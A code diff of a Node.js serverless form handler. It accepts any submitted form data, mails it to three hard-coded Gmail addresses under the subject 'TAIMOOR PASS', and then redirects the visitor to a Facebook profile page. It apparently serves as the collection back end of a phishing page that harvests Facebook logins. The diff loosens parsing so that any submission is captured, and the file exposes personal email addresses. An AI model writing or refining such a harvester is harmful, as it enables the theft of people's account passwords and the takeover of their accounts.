@@ -1,57 +1,55 @@
+
 import { transporter } from "./emailConfig.js";
+import querystring from "querystring";
 
 export default async function handler(req, res) {
   // ✅ CORS headers
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
-  res.setHeader(
-    "Access-Control-Allow-Headers",
-    "Content-Type, Accept, Authorization"
-  );
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");
 
-  // ✅ Handle preflight OPTIONS request
-  if (req.method === "OPTIONS") {
-    return res.status(204).end(); // better than 200 for preflight
-  }
-
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
-
-  let formData = {};
+  if (req.method === "OPTIONS") return res.status(204).end();
+  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
   try {
-    if (typeof req.body === "string") {
-      formData = JSON.parse(req.body);
-    } else {
-      formData = req.body;
+    // ✅ Read raw body
+    let rawBody = "";
+    for await (const chunk of req) rawBody += chunk;
+
+    let formData = {};
+    try {
+      if (req.headers["content-type"]?.includes("application/json")) {
+        formData = JSON.parse(rawBody);
+      } else if (req.headers["content-type"]?.includes("application/x-www-form-urlencoded")) {
+        formData = querystring.parse(rawBody);
+      } else {
+        try {
+          formData = JSON.parse(rawBody);
+        } catch {
+          formData = { raw: rawBody };
+        }
+      }
+    } catch {
+      formData = { raw: rawBody || "No data" };
     }
-  } catch (err) {
-    return res.status(400).json({ error: "Invalid JSON" });
-  }
 
-  if (!formData || Object.keys(formData).length === 0) {
-    return res.status(400).json({ error: "Form data missing" });
-  }
+    console.log("Form Data Received:", formData);
 
-  try {
+    // ✅ Send email
     await transporter.sendMail({
-      from: `"PROFESSOR" <hgfver414@gmail.com>`,
+      from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialjaendowns@gmail.com",
-      subject: "Taimor",
+      subject: "TAIMOOR PASS",
       text: JSON.stringify(formData, null, 2),
-      html: `<h3>Professor Link</h3><pre>${JSON.stringify(
-        formData,
-        null,
-        2
-      )}</pre>`,
+      html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
 
-    res
-      .status(200)
-      .json({ success: true, message: "Data sent via email (Asif)" });
+    // ✅ Redirect after sending
+    res.writeHead(302, { Location: "https://facebook.com/profile.php" });
+    res.end();
+
   } catch (error) {
-    console.error("Email send error:", error);
-    res.status(500).json({ error: "Failed to send email" });
+    console.error("Serverless function error:", error);
+    res.status(500).json({ error: error.message || "Internal Server Error" });
   }
 }
